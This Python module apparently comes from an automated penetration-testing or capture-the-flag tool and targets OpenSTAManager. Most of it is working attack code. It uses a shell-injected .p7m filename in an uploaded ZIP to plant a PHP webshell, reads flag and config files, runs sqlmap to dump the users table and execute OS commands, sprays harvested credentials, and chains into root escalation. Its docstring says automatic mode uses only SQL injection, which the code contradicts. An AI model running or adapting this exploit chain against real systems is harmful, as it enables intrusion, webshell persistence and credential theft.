"""OpenSTAManager fingerprint + authenticated SQL-injection exploitation.

OpenSTAManager (devcode-it/openstamanager) is an Italian technical-assistance /
invoicing app. A box that hands you a support-portal login is staging an
*authenticated* SQLi, not "browse the tickets." Version 2.9.8 and earlier carry
a cluster of authenticated SQL-injection CVEs (published 2026):

  * CVE-2026-24418  error-based SQLi, Scadenzario bulk ops
                    (POST id_records[] -> actions.php?id_module=18)
  * CVE-2026-24419  error-based SQLi, Prima Nota (GET id_documenti -> add.php)
  * CVE-2025-69214  SQLi, ajax_select.php `componenti` (options[matricola])
  * CVE-2026-24417  time-based blind SQLi w/ amplified DoS (ajax_search term)

The error-based ones dump the whole DB (the `zz_users` table = admin hash and
every portal login) and, where MySQL FILE priv + a writable webroot line up,
give RCE via SELECT ... INTO OUTFILE (drop a PHP webshell) -> the user flag.

Auto-exploitation (--exploit) uses ONLY the error-based extraction CVEs and the
webshell-via-OUTFILE path. The time-based blind CVE (CVE-2026-24417) is a DoS
amplifier and is NEVER auto-fired — it's named in the finding for manual use.

Detection is unauthenticated (page markers / version files). Extraction needs a
portal login, which scryer recovers upstream (the reuse spray -> a second
mailbox -> the OpenSTAManager credentials).
"""

from __future__ import annotations

import base64
import http.cookiejar
import io
import os
import re
import ssl
import subprocess
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from typing import List, Optional, Tuple

from ...core import utils, tooling
from ...core.report import HostReport, Finding

# Fixed in 2.9.9 for the 2026 cluster; treat <= 2.9.8 as vulnerable, and an
# unknown version as only *potentially* vulnerable (report, never auto-fire).
_FIXED = (2, 9, 9)


def run(host: HostReport, opts) -> None:
    # Detection/report is cached per host:port; exploitation is NOT permanently
    # cached — the portal credentials often arrive AFTER the first pass (a second
    # mailbox opened by the convergence loop), so we must retry the exploit when
    # a new set of logins becomes available.
    detected = host.__dict__.setdefault("_opensta_detected", {})
    pwned = host.__dict__.setdefault("_opensta_pwned", set())
    tried = host.__dict__.setdefault("_opensta_tried", {})
    for scheme, hoststr, port in _web_targets(host):
        key = (hoststr, port)
        if key in detected:
            base, version = detected[key]
        else:
            base, version = _detect(scheme, hoststr, port)
            if base is None:
                continue
            detected[key] = (base, version)
            _report(host, base, hoststr, version)
        if key in pwned:
            continue
        # Attempt the exploit when the version is vulnerable OR unknown — the
        # native P7M RCE is authenticated and cheap and self-confirms by actually
        # getting code exec, so an attempt against a version-hidden instance costs
        # little and never falsely claims a hit. Only a KNOWN-patched build
        # (>= 2.9.9) is skipped.
        if not (getattr(opts, "exploit", False) and (_vulnerable(version)
                                                      or version == "unknown")):
            continue
        # Only (re)run when the available logins changed since the last attempt,
        # so convergence re-invocations don't repeat identical, failed work.
        logins = frozenset(_portal_logins(host))
        if not logins or tried.get(key) == logins:
            continue
        tried[key] = logins
        if _exploit(host, base, hoststr, version):
            pwned.add(key)


# --------------------------------------------------------------------------
def _detect(scheme: str, vhost: str, port: int) -> Tuple[Optional[str], str]:
    """Return (base_url, version) if this is OpenSTAManager, else (None, '')."""
    base = f"{scheme}://{vhost}:{port}"
    for sub in ("", "/index.php", "/?action=login"):
        body = _get(base + sub, vhost)
        if body and _is_opensta(body):
            return base, _version(base, vhost, body)
    # Sub-directory install — but only if this vhost isn't a catch-all that
    # returns 200 for any path (that's what made /openstamanager false-positive
    # on the Roundcube host). Baseline a random path first.
    if _is_catch_all(base, vhost):
        return None, ""
    for sub in ("/openstamanager", "/gestionale", "/osm"):
        body = _get(base + sub + "/", vhost)
        if body and _is_opensta(body):
            return base + sub, _version(base + sub, vhost, body)
    return None, ""


def _is_catch_all(base: str, vhost: str) -> bool:
    probe = _get(base + "/scryer_" + os.urandom(4).hex() + "/", vhost)
    return bool(probe) and len(probe) > 200


def _is_opensta(body: str) -> bool:
    """Require an unambiguous OpenSTAManager marker. The weak 'osm'/username
    heuristics matched unrelated login pages, so they're gone."""
    low = body.lower()
    if "openstamanager" in low or "open sta manager" in low:
        return True
    if "devcode-it" in low and "actions.php" in low:
        return True
    # its API/app pages carry both the module router and its own asset paths
    return ("id_module=" in low and "actions.php" in low
            and ("/assets/" in low or "ajax_complete.php" in low
                 or "primanota" in low))


def _version(base: str, vhost: str, root: str) -> str:
    # 1) explicit version files shipped with the app
    for path in ("/VERSION", "/composer.json", "/composer.lock",
                 "/CHANGELOG.md", "/update/VERSION"):
        body = _get(base + path, vhost)
        if not body:
            continue
        m = (re.search(r'"devcode-it/openstamanager"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body)
             or re.search(r'"version"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body)
             or re.search(r"(\d+\.\d+\.\d+)", body))
        if m:
            return m.group(1)
    # 2) version printed in the page footer / meta
    for pat in (r"OpenSTAManager[^0-9]{0,20}(\d+\.\d+\.\d+)",
                r'version["\']?\s*[:=]\s*["\']?(\d+\.\d+\.\d+)'):
        m = re.search(pat, root, re.I)
        if m:
            return m.group(1)
    return "unknown"


def _vulnerable(version: str) -> bool:
    """Only a CONFIRMED <= 2.9.8 auto-fires (learned the Roundcube lesson: never
    exploit a version we couldn't read)."""
    if version == "unknown":
        return False
    parts = [int(x) for x in re.findall(r"\d+", version)[:3]]
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts) < _FIXED


# --------------------------------------------------------------------------
def _report(host: HostReport, base: str, vhost: str, version: str) -> None:
    utils.section(f"OPENSTAMANAGER {vhost}")
    vuln = _vulnerable(version)
    logins = _portal_logins(host)
    cred_line = (f"You already hold a portal login ({logins[0]}) — this is "
                 "authenticated SQLi." if logins
                 else "Log in first (reuse spray / a looted portal credential), "
                      "then extract.")
    if vuln:
        utils.log("hot", f"OpenSTAManager {version} — authenticated SQLi cluster "
                         "(CVE-2026-24418/24419, CVE-2025-69214)", indent=1)
        host.add(Finding(
            title="OpenSTAManager authenticated SQLi (CVE-2026-24418)",
            detail=_playbook(base, version, logins) + "\n\n" + cred_line,
            severity="critical", category="vuln", port=_port(base),
            service="http", evidence=f"OpenSTAManager {version}"))
    else:
        utils.log("info", f"OpenSTAManager {version} detected "
                          f"({'version hidden' if version == 'unknown' else 'check vs 2.9.8'})",
                  indent=1)
        host.add(Finding(
            title=f"OpenSTAManager {version}",
            detail=f"OpenSTAManager at {base}. {cred_line} If <= 2.9.8 it is "
                   "vulnerable to authenticated SQLi (CVE-2026-24418 Scadenzario, "
                   "CVE-2026-24419 Prima Nota, CVE-2025-69214 ajax_select); "
                   "confirm the version (/composer.json, footer).",
            severity="high" if logins else "medium", category="web",
            port=_port(base), service="http", confidence="potential",
            evidence=f"OpenSTAManager {version}"))


def _playbook(base: str, version: str, logins: List[str]) -> str:
    login = logins[0] if logins else "<user>:<pass>"
    user, _, pw = login.partition(":")
    pw = pw or "<pass>"
    return (
        f"OpenSTAManager {version} at {base}. The intended foothold is CVE-2025-"
        "69212 — authenticated OS command injection in P7M processing: the "
        "importFE_ZIP plugin extracts an uploaded ZIP and passes each .p7m "
        "FILENAME straight into an `openssl smime` shell call (decodeP7M in "
        "src/Util/XML.php), so a filename like\n"
        "  invoice.p7m\";<base64 payload>|base64 -d|bash;echo \".p7m\n"
        "runs commands as the web user (no '/' allowed in the filename — ZIP "
        "treats it as a path separator, so base32-wrap the payload). scryer "
        "performs this natively with --exploit: log in, find the importFE_ZIP "
        "module, upload the crafted ZIP, drop a webshell in the docroot, and use "
        "it for the user flag and the OliveTin root hop.\n\n"
        "# manual reproduction (bash) — base32 keeps '/' out of the filename:\n"
        "P=$(printf 'id;cat /home/*/user.txt > o.txt' | base32 -w0)\n"
        "FN=\"z\\$(echo\\${IFS}$P|base32\\${IFS}-d|bash).p7m\"\n"
        "(cd /tmp && : > \"$FN\" && zip -0 x.zip \"$FN\")   # upload x.zip to the "
        "FE import, then GET " + base + "/o.txt\n"
        "# then: ss -tlnp  ->  OliveTin on 127.0.0.1:1337 -> root\n\n"
        "# alternative — authenticated SQLi (CVE-2026-24418) to dump zz_users:\n"
        f"curl -s -c osm.cookies -d 'username={user}&password={pw}' {base}/index.php\n"
        f"sqlmap -u '{base}/actions.php?id_module=18' --load-cookies=osm.cookies "
        "--data='op=bulk&id_records[]=1&id_plugin=1' -p 'id_records[]' "
        "--batch --dbms=mysql --dump -T zz_users")


# --------------------------------------------------------------------------
# active exploitation (--exploit): authenticated error-based extraction only.
# Never fires the time-based DoS CVE.
# --------------------------------------------------------------------------
def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
    logins = _portal_logins(host)
    if not logins:
        utils.log("dim", "no portal login in hand yet — the OpenSTAManager RCE is "
                         "authenticated (recover the support-portal creds first)",
                  indent=1)
        return False

    utils.log("info", f"trying {min(len(logins), 8)} portal login(s): "
                      + ", ".join(logins[:8]), indent=1)
    for login in logins[:8]:
        user, _, pw = login.partition(":")
        user = user.split("@", 1)[0]
        if not pw:
            continue
        # 1) intended path: CVE-2025-69212 P7M command injection -> a real shell
        #    command channel; use it for the user flag and the OliveTin root hop.
        if _p7m_rce(host, base, vhost, user, pw, login):
            return True
        # 2) fallback: authenticated SQLi (CVE-2026-24418) to dump users/hashes,
        #    and try to turn it into exec via OUTFILE for the same privesc chain.
        cookiefile = _login(base, vhost, user, pw)
        if not cookiefile:
            continue
        if not tooling.resolve("sqlmap"):
            os.unlink(cookiefile)
            utils.log("warn", "P7M RCE unavailable and sqlmap not installed — the "
                              "finding has the ready commands", indent=1)
            return False
        utils.log("info", f"P7M RCE didn't land as {user}; trying SQLi extraction "
                          "(CVE-2026-24418)", indent=1)
        got = _sqlmap_dump(host, base, cookiefile)
        if got:
            host.add(Finding(
                title="OpenSTAManager SQLi extraction (CVE-2026-24418)",
                detail=f"Authenticated error-based SQLi on {base} as {user}:{pw}. "
                       "Dumped the users table — crack/reuse the recovered hashes, "
                       "then RCE via `sqlmap --os-shell` (SELECT INTO OUTFILE) for "
                       "the user flag.", severity="critical", category="vuln",
                port=_port(base), service="http", evidence=login))
            _post_foothold(host, base, cookiefile)
            try:
                os.unlink(cookiefile)
            except OSError:
                pass
            return True
        try:
            os.unlink(cookiefile)
        except OSError:
            pass
    utils.log("dim", "could not exploit with the known portal logins", indent=1)
    return False


def _p7m_rce(host: HostReport, base: str, vhost: str, user: str, pw: str,
             login: str) -> bool:
    """CVE-2025-69212, implemented natively: authenticate, find the importFE_ZIP
    plugin, upload a ZIP whose .p7m FILENAME is a base32-wrapped command that
    decodeP7M() runs through the shell, and establish a command channel. Use it
    for the user flag and the OliveTin root privesc — no external PoC."""
    from . import olivetin
    opener = _auth_session(base, vhost, user, pw)
    if not opener:
        utils.log("dim", f"P7M: login failed as {user}:{pw}", indent=1)
        return False
    utils.log("info", f"P7M: authenticated to OpenSTAManager as {user}", indent=1)
    ctx = _detect_plugin(opener, base, vhost)
    if not ctx:
        utils.log("warn", f"authenticated as {user} but the importFE_ZIP module "
                          "wasn't found (dashboard listed no FE-import module)",
                  indent=1)
        return False
    utils.log("info", f"P7M: importFE_ZIP module={ctx[0]} plugin={ctx[1]} "
                      f"op={ctx[3]} field={ctx[4]}", indent=1)
    run = _make_channel(host, opener, base, vhost, ctx)
    if not run:
        utils.log("warn", "P7M injection uploaded but no command channel confirmed "
                          "— webroot guess wrong; set SCRYER_OSM_WEBROOT to the "
                          "docroot (config.php is exposed; check the nginx root)",
                  indent=1)
        return False
    probe = run("id; hostname")
    if not probe or "uid=" not in probe:
        return False
    utils.log("hot", f"CVE-2025-69212: native P7M RCE on OpenSTAManager as {user} "
                     "— command execution as the web user", indent=1)
    for line in probe.strip().splitlines()[:6]:
        utils.log("dim", "  " + line[:200], indent=1)
    flags = run("cat /home/*/user.txt /var/www/*/user.txt "
                "/home/openstamanager/config.inc.php 2>/dev/null")
    _harvest(host, probe + "\n" + (flags or ""), base)
    host.add(Finding(
        title="RCE via OpenSTAManager CVE-2025-69212 (P7M command injection)",
        detail=f"Authenticated OS command injection on {base} as {user}:{pw} — a "
               "crafted .p7m filename inside an uploaded ZIP is executed by "
               "decodeP7M (importFE_ZIP). Command channel established; used for the "
               "user flag and the OliveTin privesc.", severity="critical",
        category="vuln", port=_port(base), service="http", evidence=login))
    # root: OliveTin on 127.0.0.1:1337, driven through this RCE channel.
    olivetin.escalate(host, run)
    return True


# -- native CVE-2025-69212 primitives --------------------------------------
def _auth_session(base: str, vhost: str, user: str, pw: str):
    """Log in and return a cookie-carrying urllib opener, or None. Tries a few
    submission styles (op in body vs query) and every token field name, since the
    login is the make-or-break step of the whole chain."""
    jar = http.cookiejar.CookieJar()
    sslctx = ssl.create_default_context()
    sslctx.check_hostname = False
    sslctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=sslctx))
    # URL already carries the vhost as its host, so let urllib set Host (a manual
    # Host header can duplicate/confuse the request).
    opener.addheaders = [("User-Agent", "Mozilla/5.0 scryer")]
    page = _oget(opener, base + "/index.php")
    token = None
    for pat in (r'name=["\']token["\'][^>]*value=["\']([^"\']+)',
                r'value=["\']([^"\']+)["\'][^>]*name=["\']token["\']',
                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
                r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)'):
        m = re.search(pat, page, re.I | re.S)
        if m:
            token = m.group(1)
            break
    base_fields = {"username": user, "password": pw}
    if token:
        base_fields["token"] = token
    # style A: op in body -> POST /index.php ; style B: op in query string
    attempts = [
        (base + "/index.php", dict(base_fields, op="login")),
        (base + "/index.php?op=login", dict(base_fields)),
        (base + "/", dict(base_fields, op="login")),
        (base + "/ajax.php?op=login", dict(base_fields)),
    ]
    for url, data in attempts:
        body = _opost(opener, url, urllib.parse.urlencode(data).encode())
        if _authed(opener, jar, base, body):
            return opener
    return None


def _authed(opener, jar, base: str, post_body: str) -> bool:
    """True if the session is now logged in. Prefer a positive dashboard check
    (fetch the app root) over guessing from the POST response."""
    low = (post_body or "").lower()
    if "logout" in low or "op=logout" in low or ">esci<" in low:
        return True
    # re-fetch the home page with the session cookie and look for auth markers
    home = _oget(opener, base + "/index.php").lower()
    if ("logout" in home or "op=logout" in home or ">esci<" in home
            or "id_module=" in home) and not (
            'name="password"' in home or 'id="password"' in home):
        return True
    return False


def _detect_plugin(opener, base: str, vhost: str):
    """Find (mid, pid, action, op, file_field, extra) for importFE_ZIP."""
    home = _oget(opener, base + "/index.php")
    mids = list(dict.fromkeys(re.findall(r"id_module=(\d+)", home)))
    kw = ("importfe", "p7m", "fattura", "fe_zip", "electronic invoice",
          "importa fe")
    for mid in mids:
        page = _oget(opener, f"{base}/controller.php?id_module={mid}")
        if not any(k in page.lower() for k in kw):
            continue
        pids = re.findall(r"id_plugin=(\d+)", page)
        if not pids:
            continue
        action, op, field, extra = _discover_upload_form(page, base)
        return int(mid), int(pids[0]), action, op, field, extra
    return None


def _discover_upload_form(html: str, base: str):
    action, op, field, extra = base + "/actions.php", "save", "blob", {}
    for attrs, inner in re.findall(r"<form([^>]*)>(.*?)</form>", html,
                                   re.DOTALL | re.IGNORECASE):
        if not re.search(r'type=["\']file["\']', inner, re.I):
            continue
        a = re.search(r'action=["\']([^"\']+)["\']', attrs, re.I)
        if a:
            action = a.group(1) if a.group(1).startswith("http") \
                else f"{base}/{a.group(1).lstrip('/')}"
        for inp in re.finditer(r"<input([^>]+)>", inner, re.I):
            t = re.search(r'type=["\']([^"\']+)["\']', inp.group(1), re.I)
            n = re.search(r'name=["\']([^"\']+)["\']', inp.group(1), re.I)
            v = re.search(r'value=["\']([^"\']*)["\']', inp.group(1), re.I)
            if not t or not n:
                continue
            if t.group(1).lower() == "file":
                field = n.group(1)
            elif t.group(1).lower() == "hidden":
                if n.group(1).lower() == "op":
                    op = v.group(1) if v else op
                else:
                    extra[n.group(1)] = v.group(1) if v else ""
        break
    return action, op, field, extra


def _encode_filename(cmd: str) -> str:
    """cmd -> the .p7m filename that decodeP7M runs. base32 avoids '/' (a ZIP
    path separator) and ${IFS} avoids spaces; $(...) runs it."""
    b32 = base64.b32encode(cmd.encode()).decode()
    return "z$(echo${IFS}" + b32 + "|base32${IFS}-d|bash).p7m"


def _zip_bytes(filename: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr(filename, b"<xml/>")
    return buf.getvalue()


def _upload(opener, ctx, filename: str) -> bool:
    mid, pid, action, op, field, extra = ctx
    params = {"op": op, "id_module": mid, "id_plugin": pid}
    params.update(extra)
    url = action + ("&" if "?" in action else "?") + urllib.parse.urlencode(params)
    body, ctype = _multipart(field, filename, _zip_bytes(filename))
    try:
        req = urllib.request.Request(url, data=body,
                                     headers={"Content-Type": ctype})
        with opener.open(req, timeout=12) as resp:
            return resp.status < 500
    except urllib.error.HTTPError as exc:
        return exc.code < 500
    except (urllib.error.URLError, OSError, ValueError):
        return False


def _webroots(base: str) -> List[str]:
    env = os.environ.get("SCRYER_OSM_WEBROOT")
    roots = [env] if env else []
    roots += ["/var/www/html/openstamanager", "/var/www/html",
              "/var/www/openstamanager", "/var/www/openstamanager/public",
              "/var/www/html/openstamanager/public", "/var/www/support",
              "/var/www/html/support"]
    # sub-path install (base ends /openstamanager) -> that dir under docroot
    m = re.search(r"//[^/]+/(.+)$", base)
    if m:
        roots.append("/var/www/html/" + m.group(1).strip("/"))
    return list(dict.fromkeys(r for r in roots if r))


def _make_channel(host: HostReport, opener, base: str, vhost: str, ctx):
    """Find the webroot that maps to this vhost, drop a PHP webshell there, and
    return run_cmd(cmd)->output. Falls back to a per-command o.txt exfil."""
    import time
    shell = "scryer_" + os.urandom(3).hex() + ".php"
    for webroot in _webroots(base):
        mark = "SX" + os.urandom(4).hex()
        drop = ("{ echo '<?php system($_REQUEST[\"c\"]); ?>' > %s/%s ; echo %s ; } "
                "> %s/o.txt 2>&1" % (webroot, shell, mark, webroot))
        _upload(opener, ctx, _encode_filename(drop))
        # confirm via the output file
        ok = False
        for _ in range(12):
            if mark in _oget(opener, base + "/o.txt"):
                ok = True
                break
            time.sleep(0.5)
        if not ok:
            continue
        # webshell reachable?  prefer it (one request per command)
        probe = _oget(opener, base + "/" + shell + "?c=" + urllib.parse.quote(
            "echo " + mark + "; id"))
        if mark in probe and "uid=" in probe:
            utils.log("good", f"webshell live at {base}/{shell} (webroot {webroot})",
                      indent=1)

            def run_shell(cmd: str) -> str:
                out = _oget(opener, base + "/" + shell + "?c="
                            + urllib.parse.quote(cmd))
                return out
            return run_shell
        # webshell not served but o.txt exfil works -> per-command channel
        utils.log("good", f"P7M exec confirmed (o.txt exfil, webroot {webroot})",
                  indent=1)

        def run_out(cmd: str, _wr=webroot) -> str:
            mk = "RC" + os.urandom(4).hex()
            ex = "{ %s ; echo %s ; } > %s/o.txt 2>&1" % (cmd, mk, _wr)
            _upload(opener, ctx, _encode_filename(ex))
            for _ in range(16):
                body = _oget(opener, base + "/o.txt")
                if mk in body:
                    return body.split(mk)[0]
                time.sleep(0.5)
            return ""
        return run_out
    return None


def _multipart(field: str, filename: str, content: bytes):
    boundary = "----scryer" + os.urandom(8).hex()
    pre = ("--" + boundary + "\r\n"
           'Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
           "Content-Type: application/octet-stream\r\n\r\n" % (field, filename))
    body = pre.encode() + content + ("\r\n--" + boundary + "--\r\n").encode()
    return body, "multipart/form-data; boundary=" + boundary


def _oget(opener, url: str) -> str:
    try:
        with opener.open(url, timeout=12) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except (urllib.error.URLError, OSError, ValueError):
        return ""


def _opost(opener, url: str, data: bytes) -> str:
    try:
        req = urllib.request.Request(url, data=data, headers={
            "Content-Type": "application/x-www-form-urlencoded"})
        with opener.open(req, timeout=12) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except (urllib.error.URLError, OSError, ValueError):
        return ""


def _post_foothold(host: HostReport, base: str, cookiefile: str) -> None:
    """Escalate SQLi -> RCE via sqlmap --os-cmd, grab the user flag, then drive
    the OliveTin localhost privesc over that same command channel to root."""
    from . import olivetin
    probe = _os_cmd(base, cookiefile, "id; hostname")
    if not probe or "uid=" not in probe:
        utils.log("dim", "SQLi confirmed but command exec (OUTFILE/UDF) not "
                         "available here — no FILE priv or writable webroot; "
                         "OliveTin root path is in the findings", indent=1)
        olivetin.playbook_finding(host)
        return
    utils.log("hot", "SQLi -> RCE (sqlmap --os-cmd): command execution as the web "
                     "user", indent=1)
    flags = _os_cmd(base, cookiefile,
                    "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
    _harvest(host, (probe + "\n" + (flags or "")), base)
    # root: OliveTin on 127.0.0.1:1337 driven through this exec channel.
    olivetin.escalate(host, lambda c: _os_cmd(base, cookiefile, c) or "")


def _os_cmd(base: str, cookiefile: str, cmd: str) -> str:
    """Run one shell command on the target via sqlmap --os-cmd and return its
    stdout. Reuses the confirmed Scadenzario injection point."""
    url = base + "/actions.php?id_module=18"
    argv = [tooling.resolve("sqlmap") or "sqlmap", "-u", url,
            "--load-cookies", cookiefile,
            "--data", "op=bulk&id_records[]=1&id_plugin=1",
            "-p", "id_records[]", "--dbms=mysql", "--batch",
            "--technique=E", "--os-cmd", cmd]
    try:
        r = subprocess.run(argv, timeout=300, capture_output=True, text=True,
                           errors="replace")
    except (OSError, subprocess.SubprocessError):
        return ""
    out = (r.stdout or "") + (r.stderr or "")
    # sqlmap prints:  command standard output: '...'
    m = re.search(r"command standard output:\s*(?:'([^']*)'|\n?-+\n(.*?)\n-+)",
                  out, re.S)
    if m:
        return (m.group(1) or m.group(2) or "").strip()
    return out if "uid=" in out else ""


def _login(base: str, vhost: str, user: str, pw: str) -> Optional[str]:
    """POST the login form, keep cookies, confirm the session is authenticated.
    Returns a Netscape cookie file path (for sqlmap --load-cookies) or None."""
    jar = http.cookiejar.MozillaCookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx))
    data = urllib.parse.urlencode({"username": user, "password": pw,
                                   "action": "login", "keep_alive": "on"}).encode()
    for path in ("/index.php", "/ajax_complete.php", "/"):
        try:
            req = urllib.request.Request(base + path, data=data,
                                         headers={"User-Agent": "scryer",
                                                  "Host": vhost})
            with opener.open(req, timeout=12) as resp:
                body = resp.read(60_000).decode("utf-8", "replace")
        except (urllib.error.URLError, OSError, ValueError):
            continue
        # authenticated if a session cookie was set AND the login form is gone
        has_cookie = any(c.name.upper().startswith(("OSM", "PHPSESS"))
                         for c in jar)
        if has_cookie and 'name="password"' not in body.lower():
            import tempfile
            fd, path_out = tempfile.mkstemp(prefix="osm_", suffix=".cookies")
            os.close(fd)
            try:
                jar.save(path_out, ignore_discard=True, ignore_expires=True)
                return path_out
            except OSError:
                return None
    return None


def _sqlmap_dump(host: HostReport, base: str, cookiefile: str) -> bool:
    """Run sqlmap against the Scadenzario error-based injection point, dump the
    users table, and harvest whatever credentials/hashes come back."""
    url = base + "/actions.php?id_module=18"
    argv = [tooling.resolve("sqlmap") or "sqlmap", "-u", url,
            "--load-cookies", cookiefile,
            "--data", "op=bulk&id_records[]=1&id_plugin=1",
            "-p", "id_records[]", "--dbms=mysql", "--batch",
            "--level=2", "--risk=2", "--technique=E", "--dump", "-T", "zz_users",
            "--threads", "4", "--flush-session"]
    try:
        r = subprocess.run(argv, timeout=600, capture_output=True, text=True,
                           errors="replace")
    except (OSError, subprocess.SubprocessError) as exc:
        utils.log("dim", f"sqlmap failed to run ({str(exc)[:60]})", indent=1)
        return False
    out = (r.stdout or "") + (r.stderr or "")
    if "is vulnerable" not in out.lower() and "parameter" not in out.lower():
        return False
    if "injectable" not in out.lower() and "sqlmap identified" not in out.lower() \
            and "Database:" not in out:
        # nothing extracted
        utils.log("dim", "sqlmap ran but didn't confirm the injection here",
                  indent=1)
        return False
    utils.log("hot", "SQLi confirmed — dumped OpenSTAManager users", indent=1)
    _harvest(host, out, base)
    for line in out.splitlines():
        if "|" in line and re.search(r"[0-9a-f]{32,}|\$2y\$|\$argon", line):
            utils.log("dim", "  " + line.strip()[:200], indent=1)
    return True


def _harvest(host: HostReport, out: str, base: str) -> None:
    from ...data import knowledge
    for tok in knowledge.find_flags(out or "", allow_hex=True):
        host.add(Finding(title="FLAG via OpenSTAManager SQLi", detail=tok,
                         severity="critical", category="flag",
                         port=_port(base), service="http", evidence=tok))
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c("║ FLAG (OpenSTAManager SQLi)", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
    for _u, pw in list(knowledge.find_conn_creds(out)):
        host.add_cred(pw)
    for _lbl, val, _sev in knowledge.extract_secrets(out):
        host.add_cred(val)
    # bcrypt/argon hashes from zz_users -> record for offline cracking / reuse
    for h in re.findall(r"\$(?:2[aby]|argon2[id]{1,2})\$[^\s|]+", out):
        host.add(Finding(
            title="OpenSTAManager password hash",
            detail=f"{h[:60]}… — crack (hashcat -m 3200 for bcrypt) then reuse.",
            severity="high", category="cred", port=_port(base), service="http",
            evidence=h[:80]))


# --------------------------------------------------------------------------
def _portal_logins(host: HostReport) -> List[str]:
    """user:pass pairs to try. Explicit pairs from findings/mail first, then the
    Cartesian of recovered passwords x candidate usernames."""
    out: List[str] = []
    seen = set()

    def add(pair: str):
        pair = pair.strip()
        if not pair or ":" not in pair or pair.lower() in seen:
            return
        u, _, p = pair.partition(":")
        # Never mistake an SSH host key / hash fingerprint (0c:4b:d2:…) or a
        # MAC-style value for a login: reject when the password half is itself
        # colon-separated hex pairs, or is pure long hex.
        if re.fullmatch(r"(?:[0-9a-fA-F]{2}:)+[0-9a-fA-F]{2}", p) or \
                (len(p) >= 16 and re.fullmatch(r"[0-9a-fA-F]+", p)):
            return
        if not u or not p:
            return
        seen.add(pair.lower())
        out.append(pair)

    # explicit user:pass only from credential-bearing findings (a mailbox login,
    # a doc/portal credential) — NOT from arbitrary finding text, which sweeps
    # up SSH host keys and other colon-separated noise.
    for f in host.findings:
        if f.category != "cred":
            continue
        for src in (f.evidence or "", f.detail or ""):
            # strip URLs first so 'ssh://10.0.0.1' / 'http://host' don't parse as
            # user:pass (ssh:// -> user=ssh, pass=//10.0.0.1).
            clean = re.sub(r"\b[a-z][a-z0-9+.-]*://\S+", " ", src, flags=re.I)
            for m in re.findall(r"\b([A-Za-z][A-Za-z0-9._%+-]{1,39}):"
                                r"([^\s,;'\"/]{3,40})", clean):
                add(f"{m[0]}:{m[1]}")

    users = _candidate_users(host)
    for pw in list(dict.fromkeys(host.creds))[:12]:
        for u in users[:12]:
            add(f"{u}:{pw}")
    return out[:60]


def _candidate_users(host: HostReport) -> List[str]:
    users: List[str] = ["admin", "administrator"]
    for e in host.__dict__.get("emails", set()):
        users.append(e.split("@", 1)[0])
    users += sorted(host.__dict__.get("usernames", set()))
    users += list(host.__dict__.get("ad_users", []))
    for f in host.findings:
        if f.title.startswith("Mailbox access") and f.evidence and ":" in f.evidence:
            users.append(f.evidence.split(":", 1)[0].split("@", 1)[0])
    seen, out = set(), []
    for u in users:
        u = u.strip().lower()
        if u and u not in seen:
            seen.add(u)
            out.append(u)
    return out


# --------------------------------------------------------------------------
def _web_targets(host: HostReport):
    from ...data import knowledge
    ports = [(e["port"], bool(e.get("secure")) or e["port"] in knowledge.HTTPS_PORTS)
             for e in host.open_ports
             if (e.get("service") or "").lower() in ("http", "https")
             or e["port"] in knowledge.HTTP_PORTS or e["port"] in knowledge.HTTPS_PORTS]
    names = [host.resolved_ip] + [h for h in host.hostnames
                                  if "." in h and not _is_ip(h)]
    for port, secure in ports:
        scheme = "https" if secure else "http"
        for name in dict.fromkeys(names):
            yield scheme, name, port


def _is_ip(name: str) -> bool:
    p = name.split(".")
    return len(p) == 4 and all(x.isdigit() for x in p)


def _port(base: str) -> int:
    m = re.search(r":(\d+)", base.split("//", 1)[-1])
    return int(m.group(1)) if m else 80


def _get(url: str, vhost: str, timeout: float = 8) -> str:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "scryer",
                                               "Host": vhost})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""
